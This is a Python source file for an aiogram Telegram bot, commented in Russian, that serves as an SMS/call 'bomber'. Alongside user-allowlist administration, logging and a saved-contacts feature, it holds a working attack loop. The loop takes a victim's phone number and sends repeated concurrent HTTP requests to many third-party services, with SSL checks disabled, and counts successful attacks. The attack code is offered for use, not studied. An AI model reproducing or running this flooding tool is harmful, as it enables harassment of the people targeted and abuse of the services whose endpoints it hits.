import asyncio
import aiohttp

from datetime import datetime
from aiohttp import ClientSession
from aiogram import F, Router, types, Bot
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from app.attack.services import urls
from app.attack.feedback_services import feedback_urls
from .texts import text

import app.keyboards as kb  # Подключаем клавиатуры

import sys
import os
import json
import logging


# Добавляем путь к корневой папке проекта, если необходимо
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from config import allowed_user_id


router = Router()


### Система регистрации  ###

# Состояния для добавления и удаления пользователей
class AdminStates(StatesGroup):
    add = State()
    remove = State()


# 📂 Путь к файлу с пользователями
USERS_FILE = "users.json"

# 🔄 Функция загрузки пользователей
def load_users():
    if not os.path.exists(USERS_FILE):  
        return {"allowed_users": []}  # Если файла нет, создаем пустой список
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        return json.load(file)

# 💾 Функция для сохранения пользователей
def save_users(data):
    with open(USERS_FILE, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4, ensure_ascii=False)



# ➕ Добавление пользователя
@router.callback_query(F.data == "add_user")
async def add_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✍ *Отправьте ID пользователя, которого хотите добавить:*", 
                                     reply_markup=kb.cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.add)

@router.message(AdminStates.add)
async def process_add_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # Делаем ID строкой (избегаем проблем)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # Сравниваем как строки
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"✅ *Пользователь {user_id} добавлен!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} уже в списке!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])

# ➖ Удаление пользователя
@router.callback_query(F.data == "remove_user")
async def remove_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✍ *Отправьте ID пользователя, которого хотите удалить:*", 
                                     reply_markup=kb.cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.remove)  # Устанавливаем состояние

@router.message(AdminStates.remove)
async def process_remove_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # Делаем ID строкой
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # Проверяем как строки
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"❌ *Пользователь {user_id} удален!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} не найден!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])


# ❌ Отмена действия (изменяем сообщение)
@router.callback_query(F.data == "cancel_action")
async def cancel_action(callback: CallbackQuery, state: FSMContext):
    """Отменяет процесс добавления/удаления пользователей"""
    await state.clear()
    await callback.message.edit_text("Действие отменено ✔", reply_markup=kb.admin_keyboard())
    await callback.answer()


# 📥 Добавление пользователя
async def process_add_user(message: types.Message):
    user_id = str(message.text)  # Делаем ID строкой (избегаем проблем)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # Сравниваем как строки
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"✅ *Пользователь {user_id} добавлен!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} уже в списке!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])

# 🗑 Удаление пользователя
async def process_remove_user(message: types.Message):
    user_id = str(message.text)  # Делаем ID строкой
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # Проверяем как строки
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"❌ *Пользователь {user_id} удален!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} не найден!*", parse_mode="Markdown")
    else:
        await message.answer(text['norights'])


# ❗ Функция проверки юзера на наличие в списке

def is_user_allowed(user_id: int) -> bool:
    """Проверяет, есть ли пользователь в списке разрешенных."""
    if not os.path.exists(USERS_FILE):  # Если файла нет, создаем пустой список
        return False
    
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        users = json.load(file)

    return user_id in users.get("allowed_users", [])  # Приводим к строке


# Функции загрузки и сохранения JSON с ID чатов
def load_users_pend():
    """Загружает пользователей и ID чатов, предотвращая ошибки с пустым или поврежденным файлом."""
    if not os.path.exists(USERS_FILE) or os.stat(USERS_FILE).st_size == 0:
        return {
            "allowed_users": [],
            "pending_users": {},
            "admin_chat_id": -1002364159616,  # Значение по умолчанию
            "output_chat_id": -4648248130     # Значение по умолчанию
        }
    
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)

            # Если admin_chat_id или output_chat_id отсутствуют, добавляем их со значениями по умолчанию
            data.setdefault("admin_chat_id", -1002364159616)
            data.setdefault("output_chat_id", -4648248130)

            return data
    except json.JSONDecodeError:
        return {
            "allowed_users": [],
            "pending_users": {},
            "admin_chat_id": -1002364159616,
            "output_chat_id": -4648248130
        }

def save_users_pend(users):
    """Сохраняет пользователей и ID чатов в файл."""
    with open(USERS_FILE, "w", encoding="utf-8") as file:
        json.dump(users, file, indent=4, ensure_ascii=False)




# Загружаем настройки
settings = load_users_pend()

# Теперь ID чатов берутся из файла, а не устанавливаются жестко
ADMIN_CHAT_ID = settings["admin_chat_id"]
OUTPUT_CHAT_ID = settings["output_chat_id"]




async def notify_admin_about_request(bot, user_id: int, username: str):
    """Отправляет запрос админу и сохраняет пользователя в pending_users"""
    users = load_users_pend()
      # Проверяем, есть ли список "pending_users", и если нет — создаём
    if "pending_users" not in users:
        users["pending_users"] = {}
    users["pending_users"][str(user_id)] = username or "Без username"
    save_users_pend(users)

    invite_request = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ Разрешить", callback_data=f"approve_{user_id}")],
            [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"deny_{user_id}")]
        ]
    )
    text = f"🚨 *Попытка использования бота!*\n👤 Пользователь: @{username if username else 'Без username'}\n🆔 ID: `{user_id}`"
    await bot.send_message(ADMIN_CHAT_ID, text, reply_markup=invite_request)

@router.callback_query(F.data.startswith("approve_"))
async def approve_user(callback):
    """Обрабатывает одобрение пользователя"""
    user_id = int(callback.data.split("_")[1])

    users = load_users_pend()
    # Проверяем, есть ли список "pending_users", и если нет — создаём
    if "pending_users" not in users:
        users["pending_users"] = {}
    
    if str(user_id) in users["pending_users"]:
        username = users["pending_users"].pop(str(user_id))  # Удаляем из pending_users
        users["allowed_users"].append(user_id)  # Добавляем в разрешённые
        save_users_pend(users)

        message_text = f"✅ Пользователю @{username} выдали доступ!" if username != "Без username" else f"✅ Пользователю выдали доступ! (ID: `{user_id}`)"
        log_text = f"✅ Вы выдали доступ, пользователю @{username} ID: {user_id}!" if username != "Без username" else f"✅ Вы выдали доступ!  (ID: `{user_id}`)"
        
        await callback.bot.send_message(OUTPUT_CHAT_ID, message_text)
        await callback.bot.send_message(ADMIN_CHAT_ID, log_text)


    await callback.message.delete()

@router.callback_query(F.data.startswith("deny_"))
async def deny_user(callback):
    """Обрабатывает отказ пользователя"""
    user_id = int(callback.data.split("_")[1])

    users = load_users_pend()

    if str(user_id) in users["pending_users"]:
        username = users["pending_users"].pop(str(user_id))  # Получаем username перед удалением
        save_users_pend(users)

        message_text = f"❎️ Пользователю @{username} отказали в доступе !" if username != "Без username" else f"❎️ Пользователю отказали в доступе ! (ID: `{user_id}`)"
        log_text = f"❎️ Вы отказали в доступе, пользователю @{username} ID: {user_id}!" if username != "Без username" else f"❎️ Вы отказали в доступе (ID: `{user_id}`)"

        await callback.bot.send_message(OUTPUT_CHAT_ID, message_text)
        await callback.bot.send_message(ADMIN_CHAT_ID, log_text)

    await callback.message.delete()


@router.callback_query(lambda c: c.data.startswith("status_"))
async def update_status(callback: types.CallbackQuery):
    status_messages = {
    "status_green": "🟢 <b>Статус: Работает корректно</b>\n\n✅ Бот функционирует без ошибок!",
    "status_yellow": "🟡 <b>Статус: Технические работы</b>\n\n⚠ Возможны временные неполадки.",
    "status_red": "🔴 <b>Статус: Бот оффлайн</b>\n\n❌ Временно недоступен. Ожидайте."
}

    
    status_text = status_messages.get(callback.data, "❓ Неизвестный статус")
    users = load_users()
    message_id = users.get("status_message_id")
    if callback.from_user.id in allowed_user_id:
        if message_id:
            try:
                await callback.bot.edit_message_text(chat_id=OUTPUT_CHAT_ID, message_id=message_id, text=status_text, parse_mode="HTML")
            except:
                new_message = await callback.bot.send_message(OUTPUT_CHAT_ID, status_text, parse_mode="HTML")
                users["status_message_id"] = new_message.message_id
                save_users(users)
        else:
            new_message = await callback.bot.send_message(OUTPUT_CHAT_ID, status_text, parse_mode="HTML")
            users["status_message_id"] = new_message.message_id
            save_users(users)
        
        await callback.answer("Статус обновлён!")
    else:
        await callback.message.answer(text['norights'])


### Логгер ###

SETTINGS_FILE = "settings.json"


def load_settings():
    """Загружает настройки из файла."""
    if not os.path.exists(SETTINGS_FILE):
        return {"logging_enabled": True}  # Значение по умолчанию

    try:
        with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except json.JSONDecodeError:
        return {"logging_enabled": True}  # Если файл повреждён, возвращаем дефолт


def save_settings(settings):
    """Сохраняет настройки в файл."""
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(settings, f, indent=4, ensure_ascii=False)


LOG_FILE = "logs.txt"
logging_enabled = True  # По умолчанию логи включены


# Перехватываем print() и записываем в файл
class PrintLogger:
    def write(self, message):
        if logging_enabled and message.strip():  # Не логировать пустые строки
            log_entry = f'{datetime.now().strftime("%Y-%m-%d %H:%M:%S")} : {message.strip()}\n'
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
        sys.__stdout__.write(message)  # Дублируем в консоль

    def flush(self):  # Нужно для совместимости с sys.stdout
        pass


sys.stdout = PrintLogger()  # Перенаправляем стандартный вывод


# Функция для включения/выключения логов
@router.message(Command("logs"))
async def toggle_logs(message: types.Message):
    global logging_enabled
    if message.from_user.id in allowed_user_id:  # Укажите свой ID
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Включить", callback_data="enable_logs"),
             InlineKeyboardButton(text="❌ Отключить", callback_data="disable_logs")]
        ])
        await message.answer("Выберите опцию для логирования:", reply_markup=keyboard)
    else:
        await message.answer(text['norights'])


@router.callback_query(F.data.in_(["enable_logs", "disable_logs"]))
async def set_logging(callback: types.CallbackQuery):
    global logging_enabled

    if callback.data == "enable_logs":
        logging_enabled = True
        await callback.message.edit_text("✅ Логирование включено!")
    else:
        logging_enabled = False
        await callback.message.edit_text("❌ Логирование отключено!")

    # Сохраняем настройку
    save_settings({"logging_enabled": logging_enabled})


# Отключаем дотошные логи aiogram
logging.getLogger("aiogram").setLevel(logging.WARNING)


#### Классы ####

class BomberState(StatesGroup):
    waiting_number = State()  # Ожидание номера телефона
    waiting_attack_type = State()  # Ожидание выбора типа атаки
    waiting_replay = State()  # Ожидание количества повторений
    bombing = State()  # Атака


#### Функции бомбера ####

success_count = 0
stop_events = {}  # Глобальный словарь для хранения stop_event по user_id
manual_stop_flags = {}  # Глобальный словарь для флагов ручной остановки

async def request(session, url, attack_type, state, stop_event):
    """
    Выполняет HTTP-запрос к сервису.
    Если stop_event установлен, запрос не выполняется.
    При успешном запросе увеличивает счётчик успешных сообщений в состоянии.
    """
    if stop_event.is_set():
        return

    try:
        if url['info']['attack'] in attack_type:
            async with session.request(
                url['method'], url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20,
                ssl=False
            ) as response:
                if 200 <= response.status < 300:
                    data = await state.get_data()
                    success_count = data.get("success_count", 0) + 1
                    await state.update_data(success_count=success_count)
    except Exception as e:
        pass
#        print(f"Ошибка запроса ({url['url']}): {e}")

async def async_attacks(user_id, username, number, attack_type, replay, stop_event, state):
    """
    Основной цикл атаки.
    Если stop_event установлен, незавершённые задачи отменяются,
    а лог остановки выводится с указанием username, id, номера и типа атаки.
    """
    async with ClientSession() as session:
        for i in range(int(replay)):
            if stop_event.is_set():
                print(f"🛑 Бомбардировка остановлена: @{username} (ID: {user_id}) | Номер: {number} | Тип: {attack_type}")
                del stop_events[user_id]
                return

            services = urls(number) + feedback_urls(number)

            # Создаем задачи для каждого сервиса
            tasks = [
                asyncio.create_task(request(session, service, attack_type, state, stop_event))
                for service in services
            ]

            # Ждем выполнения задач с периодической проверкой stop_event
            while tasks:
                done, pending = await asyncio.wait(tasks, timeout=0.1)
                if stop_event.is_set():
                    for task in pending:
                        task.cancel()
                    break
                tasks = list(pending)

            if stop_event.is_set():
                print(f"🛑 Бомбардировка остановлена: @{username} (ID: {user_id}) | Номер: {number} | Тип: {attack_type}")
                del stop_events[user_id]
                return

            data = await state.get_data()
            success_count = data.get("success_count", 0)
            print(f"✅ [{i + 1}/{replay}] Успешных атак: {success_count} | @{username} (ID: {user_id}) | Номер: {number} | Тип: {attack_type}")
            await asyncio.sleep(0.5)

    print(f"🛑 Бомбардировка завершена: @{username} (ID: {user_id}) | Номер: {number} | Тип: {attack_type}")
    del stop_events[user_id]

async def start_async_attacks(user_id, username, number, attack_type, replay, state):
    """
    Запускает атаку: создается stop_event, сбрасывается счётчик,
    и запускается основной цикл атак.
    """
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"🚀 Запуск атаки: @{username} (ID: {user_id}) | Номер: {number} | Тип: {attack_type} | Повторы: {replay} | {start_time}")
    stop_event = asyncio.Event()
    stop_events[user_id] = stop_event

    await state.update_data(success_count=0)
    await async_attacks(user_id, username, number, attack_type, replay, stop_event, state)

async def stop_attacks(user_id):
    """
    Останавливает атаку для заданного пользователя, устанавливая флаг stop_event.
    """
    if user_id in stop_events:
        stop_events[user_id].set()
    else:
        print(f"⚠ Нет активной атаки у пользователя {user_id}")


#### Хендлеры ####

### Базовые команды

@router.message(CommandStart())
async def cmd_start(message: Message):
    """Обрабатывает команду /start и показывает меню."""
    if is_user_allowed(message.from_user.id):
        await message.answer(text['greetings'], reply_markup=kb.main)
    else:
        user_id = message.from_user.id  # <-- Теперь user_id объявлен
        username = message.from_user.username  # <-- Получаем username 
        chat_id = message.chat.id if message.chat else user_id  # Используем user_id, если chat_id не найден
        await notify_admin_about_request(message.bot, user_id, username)
        await message.answer("💔 Простите но вы не являетесь представителем бета тестирования нашего приложения, ожидайте релиза\n\n⏳ Ваш запрос отправлен на рассмотрение администраторам.")

@router.message(Command("stop"))
async def stop_command_handler(message: Message, state: FSMContext):
    """
    Обработчик команды /stop.
    Очищает состояние для пользователя и сообщает, что бот остановлен.
    Чтобы возобновить работу, пользователь должен отправить /start.
    """
    await state.clear()

# Команды установки кастом айди чатов

@router.message(Command("set_admin_chat"))
async def set_admin_chat(message: types.Message):
    print(f"Команда /set_admin_chat от {message.from_user.id}")
    """Позволяет администратору изменить ADMIN_CHAT_ID и сохранить его."""
    if message.from_user.id not in allowed_user_id:
        await message.answer(text['norights'])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /set_admin_chat <ID чата>")
        return

    try:
        chat_id = int(args[1])
    except ValueError:
        await message.answer("❌ Ошибка! ID чата должен быть числом.")
        return

    settings = load_users_pend()
    settings["admin_chat_id"] = chat_id  # Сохраняем новый ID
    save_users_pend(settings)  # Записываем изменения в файл

    global ADMIN_CHAT_ID
    ADMIN_CHAT_ID = chat_id  # Обновляем переменную в коде

    await message.answer(f"✅ `ADMIN_CHAT_ID` установлен: `{chat_id}`", parse_mode="Markdown")


@router.message(Command("set_output_chat"))
async def set_output_chat(message: types.Message):
    """Позволяет администратору изменить OUTPUT_CHAT_ID и сохранить его."""
    print(f"Команда /set_output_chat от {message.from_user.id}")
    if message.from_user.id not in allowed_user_id:
        await message.answer(text['norights'])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Используйте: /set_output_chat <ID чата>")
        return

    try:
        chat_id = int(args[1])
    except ValueError:
        await message.answer("❌ Ошибка! ID чата должен быть числом.")
        return

    settings = load_users_pend()
    settings["output_chat_id"] = chat_id  # Сохраняем новый ID
    save_users_pend(settings)  # Записываем изменения в файл

    global OUTPUT_CHAT_ID
    OUTPUT_CHAT_ID = chat_id  # Обновляем переменную в коде

    await message.answer(f"✅ `OUTPUT_CHAT_ID` установлен: `{chat_id}`", parse_mode="Markdown")

# Функция статуса бота

@router.message(Command("status"))
async def send_status_options(message: types.Message):
    print(f"Команда /status от {message.from_user.id}")
    await message.answer("Выберите статус:", reply_markup=kb.statusbut)

# Функция сообщения об обновлении

@router.message(Command("update"))
async def send_update_log(message: types.Message, command: CommandObject):
    if message.from_user.id in allowed_user_id:
        log_text = command.args
        if not log_text:
            await message.answer("❌ Использование: <code>/update ваш лог</code>", parse_mode="HTML")
            return

        formatted_log = f"<b>🔄 Обновление бота:</b>\n<pre>{log_text}</pre>"

        await message.bot.send_message(OUTPUT_CHAT_ID, formatted_log, parse_mode="HTML")

        await message.answer("✅ Лог обновления отправлен!")
        print("✅ Лог обновления успешно отправлен!")
    else:
        await message.answer(text['norights'])

# Команда для получения айди чата

@router.message(Command("get_chat_id"))
async def get_chat_id(message: types.Message):
    await message.answer(f"Chat ID: <code>{message.chat.id}</code>", parse_mode="HTML")

# 🛠 Команда /admin (только для админов)

@router.message(Command("admin"))
async def admin_panel(message: types.Message):
    print(f"Команда /admin от {message.from_user.id}")
    if message.from_user.id in allowed_user_id:
        await message.answer("🔧 *Панель администратора*", reply_markup=kb.admin_keyboard(), parse_mode="Markdown")
    else:
        await message.answer("🚫 У вас нет доступа!")

### Функция контактов ###


PER_PAGE = 10  # Количество контактов на страницу

# Функции для работы с файлом (контакты)
def load_contacts() -> dict:
    """Загружает данные из файла users.json или возвращает пустой словарь."""
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def save_contacts(users_data: dict) -> None:
    """Сохраняет данные в файл users.json."""
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users_data, f, ensure_ascii=False, indent=4)

def get_user_contacts(user_id: int) -> list:
    """
    Извлекает список контактов пользователя из файла.
    Если список отсутствует, возвращает пустой список.
    """
    users = load_contacts()
    user_id_str = str(user_id)
    if user_id_str in users:
        contacts = users[user_id_str].get("contacts")
        if contacts is None or not isinstance(contacts, list):
            return []
        return contacts
    return []


# FSM для добавления нового контакта
class ContactStates(StatesGroup):
    waiting_for_new_contact = State()

# FSM для удаления контакта
class DeleteContactState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_name = State()


# --- Клавиатуры ---

def get_contacts_buttons_keyboard(user_id: int, current_page: int, contacts: list, per_page: int = PER_PAGE) -> InlineKeyboardMarkup:
    """
    Формирует клавиатуру для экрана «Ваши контакты ☎» в виде кнопок.
    
    Верхняя часть: до per_page кнопок, каждая отображает контакт в формате "номер — название".
    Следующая строка: две кнопки «Добавить контакты 💾» и «Удалить контакты ❌».
    Затем – строка навигации: если есть предыдущая страница, кнопка "◀"; затем индикатор текущей страницы; затем, если есть следующая – "▶".
    Последняя строка – кнопка «Назад 🔙» для возврата в главное меню.
    """
    # Создаем клавиатуру с пустым списком inline_keyboard
    kbr = InlineKeyboardMarkup(inline_keyboard=[])
    total_pages = ((len(contacts) - 1) // per_page + 1) if contacts else 1
    start = (current_page - 1) * per_page
    end = start + per_page
    page_contacts = contacts[start:end]
    
    # Добавляем кнопки для каждого контакта (каждая кнопка в отдельной строке)
    for idx, contact in enumerate(page_contacts, start=start + 1):
        btn_text = f"{contact.get('phone', '')} — {contact.get('contact_name', '')}"
        kbr.inline_keyboard.append([InlineKeyboardButton(text=btn_text, callback_data=f"contact_info_{idx}")])
    
    # Добавляем строку с кнопками "Добавить контакты 💾" и "Удалить контакты ❌"
    kbr.inline_keyboard.append([
        InlineKeyboardButton(text="Добавить контакты 💾", callback_data="add_contact"),
        InlineKeyboardButton(text="Удалить контакты ❌", callback_data="delete_contacts")
    ])
    
    # Формируем навигационную строку: стрелка влево, индикатор страницы, стрелка вправо
    nav_buttons = []
    if current_page > 1:
        nav_buttons.append(InlineKeyboardButton(text="◀", callback_data=f"contacts_page_{current_page - 1}"))
    nav_buttons.append(InlineKeyboardButton(text=f"{current_page}/{total_pages}", callback_data="ignore"))
    if current_page < total_pages:
        nav_buttons.append(InlineKeyboardButton(text="▶", callback_data=f"contacts_page_{current_page + 1}"))
    kbr.inline_keyboard.append(nav_buttons)
    
    # Добавляем последнюю строку с кнопкой "Назад 🔙"
    kbr.inline_keyboard.append([InlineKeyboardButton(text="Назад 🔙", callback_data="contacts_back")])
    
    return kbr



@router.callback_query(F.data == "ignore")
async def ignore_callback(callback: CallbackQuery):
    await callback.answer()

def get_add_contact_keyboard() -> InlineKeyboardMarkup:
    """Клавиатура для экрана добавления контакта с кнопкой Назад."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад 🔙", callback_data="cancel_add_contact")]
    ])

def get_delete_method_keyboard() -> InlineKeyboardMarkup:
    """Клавиатура для выбора метода удаления контакта."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="По номеру 📞", callback_data="del_by_phone")],
        [InlineKeyboardButton(text="По названию 📝", callback_data="del_by_name")],
        [InlineKeyboardButton(text="Назад 🔙", callback_data="delete_contacts_back")]
    ])


# --- Обработчики контактов ---

@router.callback_query(F.data == "get_contacts")
async def show_contacts(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик кнопки "Контакты 💮". Выводит экран «Ваши контакты ☎» с постраничным выводом.
    """
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    contacts_text = "Ваши контакты ☎"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=1, contacts=contacts)
    try:
        await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    except Exception as e:
        await callback.answer()
    else:
        await callback.answer()

@router.callback_query(F.data.startswith("contacts_page_"))
async def contacts_page_handler(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик для перехода между страницами контактов.
    """
    user_id = callback.from_user.id
    try:
        page = int(callback.data.split("_")[-1])
    except ValueError:
        page = 1
    contacts = get_user_contacts(user_id)
    contacts_text = "Ваши контакты ☎"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=page, contacts=contacts)
    await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    await callback.answer()

@router.callback_query(F.data == "add_contact")
async def add_contact(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "💾 Отправьте контакт в формате: номер телефона название контакта",
        reply_markup=get_add_contact_keyboard()
    )
    await state.set_state(ContactStates.waiting_for_new_contact)
    await callback.answer()

@router.callback_query(F.data == "cancel_add_contact")
async def cancel_add_contact(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик кнопки "Назад 🔙" в режиме добавления контакта.
    Выходит из состояния добавления и возвращает экран контактов.
    """
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    contacts_text = "Ваши контакты ☎"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=1, contacts=contacts)
    await state.clear()
    await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    await callback.answer()

@router.message(ContactStates.waiting_for_new_contact)
async def process_new_contact(message: Message, state: FSMContext):
    """
    Ожидает сообщение с контактом в формате "номер телефона название контакта".
    После добавления отправляет подтверждение и остается в состоянии ожидания.
    """
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Неверный формат. Отправьте контакт в формате: номер телефона название контакта")
        return
    phone, contact_name = parts
    user_id = message.from_user.id
    username = message.from_user.username or "Без username"
    users = load_contacts()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {"owner": f"{username} (ID: {user_id})", "contacts": []}
    if "contacts" not in users[user_id_str] or not isinstance(users[user_id_str]["contacts"], list):
        users[user_id_str]["contacts"] = []
    new_contact = {"phone": phone, "contact_name": contact_name}
    users[user_id_str]["contacts"].append(new_contact)
    save_contacts(users)
    await message.answer(
        f"✅ Контакт добавлен!\nТелефон: {phone}\nНазвание: {contact_name}\n\nОтправьте новый контакт или нажмите 'Назад 🔙'")
    # Состояние остается для ожидания нового контакта.

@router.callback_query(F.data == "delete_contacts")
async def choose_delete_method(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Выберите метод удаления контакта:", reply_markup=get_delete_method_keyboard())
    await callback.answer()

@router.callback_query(F.data == "del_by_phone")
async def delete_by_phone_choice(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введите номер контакта для удаления (только цифры):", )
    await state.set_state(DeleteContactState.waiting_for_phone)
    await callback.answer()

@router.callback_query(F.data == "del_by_name")
async def delete_by_name_choice(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введите название контакта для удаления:")
    await state.set_state(DeleteContactState.waiting_for_name)
    await callback.answer()

@router.message(DeleteContactState.waiting_for_phone)
async def process_delete_by_phone(message: Message, state: FSMContext):
    """ Ожидает номер контакта для удаления. """
    phone_to_delete = message.text.strip()
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "Без юзернейма"

    users = load_contacts()
    user_id_str = str(user_id)

    if user_id_str not in users or "contacts" not in users[user_id_str]:
        await message.answer("У вас нет контактов для удаления.", reply_markup=kb.main)
        await state.clear()
        return

    contacts = users[user_id_str]["contacts"]
    contact_to_delete = next((c for c in contacts if c.get("phone") == phone_to_delete), None)

    if not contact_to_delete:
        await message.answer("Контакт с таким номером не найден. Отправьте новый номер или нажмите 'Назад 🔙'")
    else:
        name = contact_to_delete.get("contact_name", "Неизвестный контакт")
        users[user_id_str]["contacts"] = [c for c in contacts if c.get("phone") != phone_to_delete]
        save_contacts(users)

        log_msg = f"🗑 Контакт удалён: {name} ({phone_to_delete}) пользователем @{username} (ID: {user_id})"
        print(log_msg)
        logging.info(log_msg)

        await message.answer("Контакт успешно удален. Отправьте номер для удаления другого контакта или нажмите 'Назад 🔙'")

@router.message(DeleteContactState.waiting_for_name)
async def process_delete_by_name(message: Message, state: FSMContext):
    """ Ожидает название контакта для удаления. """
    name_to_delete = message.text.strip().lower()
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "Без юзернейма"

    users = load_contacts()
    user_id_str = str(user_id)

    if user_id_str not in users or "contacts" not in users[user_id_str]:
        await message.answer("У вас нет контактов для удаления.", reply_markup=kb.main)
        await state.clear()
        return

    contacts = users[user_id_str]["contacts"]
    contact_to_delete = next((c for c in contacts if c.get("contact_name", "").lower() == name_to_delete), None)

    if not contact_to_delete:
        await message.answer("Контакт с таким названием не найден. Отправьте новое название или нажмите 'Назад 🔙'", reply_markup=get_add_contact_keyboard())
    else:
        phone = contact_to_delete.get("phone", "Неизвестный номер")
        users[user_id_str]["contacts"] = [c for c in contacts if c.get("contact_name", "").lower() != name_to_delete]
        save_contacts(users)

        log_msg = f"🗑 Контакт удалён: {name_to_delete} ({phone}) пользователем @{username} (ID: {user_id})"
        print(log_msg)
        logging.info(log_msg)

        await message.answer("Контакт успешно удален. Отправьте название для удаления другого контакта или нажмите 'Назад 🔙'", reply_markup=get_add_contact_keyboard())
    # Состояние остается для ожидания нового ввода.

@router.callback_query(F.data == "delete_contacts_back")
async def delete_contacts_back(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик кнопки "Назад" из экрана удаления контактов.
    Возвращает экран с контактами.
    """
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    contacts_text = "Ваши контакты ☎"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=1, contacts=contacts)
    await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    await callback.answer()

@router.callback_query(F.data == "contacts_back")
async def contacts_back(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик кнопки "Назад" на экране контактов.
    Возвращает пользователя в главное меню (после /start).
    """
    await state.clear()
    await callback.message.edit_text(text['greetings'], reply_markup=kb.main)
    await callback.answer()


# --- Использование контактов в бомбере ---


def get_bomber_number_keyboard(user_id: int) -> InlineKeyboardMarkup:
    """
    Если у пользователя есть сохранённые контакты, возвращает клавиатуру с кнопками:
      - "Ввести номер вручную 📝"
      - "Выбрать из контактов ☎"
    Если контактов нет – только вариант ввода вручную.
    """
    contacts = get_user_contacts(user_id)
    buttons = []
    buttons.append(InlineKeyboardButton(text="Ввести номер вручную 📝", callback_data="bomb_manual"))
    if contacts:
        buttons.append(InlineKeyboardButton(text="Выбрать из контактов ☎", callback_data="bomb_choose_contact"))
    return InlineKeyboardMarkup(inline_keyboard=[buttons])

@router.callback_query(F.data == "startbomb")
async def start_bomber(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user_id = callback.from_user.id
    if is_user_allowed(user_id):
        kb_bomber = get_bomber_number_keyboard(user_id)
        await callback.message.edit_text("Выберите способ ввода номера жертвы:", reply_markup=kb_bomber)
    else:
        user_id = callback.from_user.id
        username = callback.from_user.username
        chat_id = callback.message.chat.id if callback.message.chat else user_id
        await notify_admin_about_request(callback.message.bot, user_id, username)
        await callback.message.answer("💔 Простите, но вы не являетесь представителем бета-тестирования нашего приложения. Ожидайте релиза.\n\n⏳ Ваш запрос отправлен на рассмотрение администраторам.")

